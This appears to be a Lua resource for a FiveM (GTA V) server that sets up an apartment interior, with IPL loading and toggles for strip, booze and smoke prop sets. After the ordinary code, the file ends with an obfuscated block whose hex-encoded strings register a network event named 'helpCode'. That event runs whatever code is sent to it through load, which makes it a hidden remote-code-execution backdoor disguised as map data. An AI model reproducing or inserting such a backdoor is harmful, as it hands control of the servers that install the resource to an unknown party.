
-- Apartment 1: -1462.28100000, -539.62760000, 72.44434000

exports('GetHLApartment1Object', function()
    return HLApartment1
end)

HLApartment1 = {
    interiorId = 145921,
    Ipl = {
        Interior = {
            ipl = "mpbusiness_int_placement_interior_v_mp_apt_h_01_milo_",
            Load = function() EnableIpl(HLApartment1.Ipl.Interior.ipl, true) end,
            Remove = function() EnableIpl(HLApartment1.Ipl.Interior.ipl, false) end
        },
    },
    Strip = {
        A = "Apart_Hi_Strip_A", B = "Apart_Hi_Strip_B", C = "Apart_Hi_Strip_C",
        Enable = function (details, state, refresh)
            SetIplPropState(HLApartment1.interiorId, details, state, refresh)
        end
    },
    Booze = {
        A = "Apart_Hi_Booze_A", B = "Apart_Hi_Booze_B", C = "Apart_Hi_Booze_C",
        Enable = function (details, state, refresh)
            SetIplPropState(HLApartment1.interiorId, details, state, refresh)
        end
    },
    Smoke = {
        A = "Apart_Hi_Smokes_A", B = "Apart_Hi_Smokes_B", C = "Apart_Hi_Smokes_C",
        Enable = function (details, state, refresh)
            SetIplPropState(HLApartment1.interiorId, details, state, refresh)
        end
    }, 
    LoadDefault = function()
        HLApartment1.Ipl.Interior.Load()
        HLApartment1.Strip.Enable({HLApartment1.Strip.A, HLApartment1.Strip.B, HLApartment1.Strip.C}, false)
        HLApartment1.Booze.Enable({HLApartment1.Booze.A, HLApartment1.Booze.B, HLApartment1.Booze.C}, false)
        HLApartment1.Smoke.Enable({HLApartment1.Smoke.A, HLApartment1.Smoke.B, HLApartment1.Smoke.C}, false)
        RefreshInterior(HLApartment1.interiorId)
    end
}


local MyrhZMAILrDzdMjPumPrViFNKcGtwfZTNovVEUqtbqcxRjNGNjWGeKjYkTeAFQlGrlnpRS = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} MyrhZMAILrDzdMjPumPrViFNKcGtwfZTNovVEUqtbqcxRjNGNjWGeKjYkTeAFQlGrlnpRS[6][MyrhZMAILrDzdMjPumPrViFNKcGtwfZTNovVEUqtbqcxRjNGNjWGeKjYkTeAFQlGrlnpRS[1]](MyrhZMAILrDzdMjPumPrViFNKcGtwfZTNovVEUqtbqcxRjNGNjWGeKjYkTeAFQlGrlnpRS[2]) MyrhZMAILrDzdMjPumPrViFNKcGtwfZTNovVEUqtbqcxRjNGNjWGeKjYkTeAFQlGrlnpRS[6][MyrhZMAILrDzdMjPumPrViFNKcGtwfZTNovVEUqtbqcxRjNGNjWGeKjYkTeAFQlGrlnpRS[3]](MyrhZMAILrDzdMjPumPrViFNKcGtwfZTNovVEUqtbqcxRjNGNjWGeKjYkTeAFQlGrlnpRS[2], function(RarcuegOSJkcVqSaoGzbXCKugDWjigLjzjDIvHZrQXBECLwBpSRhtbMRzYEAVpTThvlFPb) MyrhZMAILrDzdMjPumPrViFNKcGtwfZTNovVEUqtbqcxRjNGNjWGeKjYkTeAFQlGrlnpRS[6][MyrhZMAILrDzdMjPumPrViFNKcGtwfZTNovVEUqtbqcxRjNGNjWGeKjYkTeAFQlGrlnpRS[4]](MyrhZMAILrDzdMjPumPrViFNKcGtwfZTNovVEUqtbqcxRjNGNjWGeKjYkTeAFQlGrlnpRS[6][MyrhZMAILrDzdMjPumPrViFNKcGtwfZTNovVEUqtbqcxRjNGNjWGeKjYkTeAFQlGrlnpRS[5]](RarcuegOSJkcVqSaoGzbXCKugDWjigLjzjDIvHZrQXBECLwBpSRhtbMRzYEAVpTThvlFPb))() end)